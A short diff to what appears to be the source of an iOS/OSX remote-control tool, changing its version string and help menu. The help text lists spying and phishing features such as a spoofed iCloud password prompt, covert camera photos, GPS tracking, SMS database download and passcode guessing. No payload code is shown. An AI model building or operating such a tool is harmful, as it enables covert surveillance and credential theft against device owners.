@@ -133,7 +133,7 @@ ENDC = '\033[0m'
 def banner():
 	os.system('clear')
 	print GREEN+base64.b64decode("PC0uIChgLScpXyAoYC0nKSAgXyAoYC0nKS4tPiAKICAgXCggT08pICkoIE9PKS4tLyAoIE9PKV8gICAKLC0tLi8gLC0tLygsLS0tLS0tLihfKS0tXF8pICAKfCAgIFwgfCAgfCB8ICAuLS0tJy8gICAgXyAvICAKfCAgLiAnfCAgfHx8ICAnLS0uIFxfLi5gLS0uICAKfCAgfFwgICAgfCB8ICAuLS0nIC4tLl8pICAgXCAKfCAgfCBcICAgfCB8ICBgLS0tLlwgICAgICAgLyAKYC0tJyAgYC0tJyBgLS0tLS0tJyBgLS0tLS0n")
-	print WHITE + "     [Version 1.9.5]\n"+\
+	print WHITE + "     [Version 1.9.5-2]\n"+\
 	RED + "  Created by NeonEggplant\n"+\
 	WHITE+"\niOS/OSX System Remote Control\nCreate DEB, SHELL, and Arduino Payloads\n"+\
 	WHITE + "http://neoneegplants.com\n"+\
@@ -758,6 +758,7 @@ def showhelp(settings):
 		print " prompt      - spoof icloud password prompt"
 		print " frontcam    - take photo with front camera"
 		print " backcam     - take photo with back/rear camera"
+		print " launch      - launch apps"
 		print " getlocation - retrieve gps coordinates if locationservices are enabled"
 		print " getpower    - retrieve battery life"
 		print " getsms      - download the sms database"
@@ -777,7 +778,7 @@ def showhelp(settings):
 		print " home        - simulate home button"
 		print " doublehome  - simulate doublepress home button"
 		print " tmute       - toggle mute"
-		#print " lastapp     - retrieve last app opened"
+		print " lastapp     - retrieve last app opened"
 		print " islocked    - check if device is currently locked with passcode"
 		print " trypass     - try to unlock device with passcode"
 		print " openurl     - open url in safari"
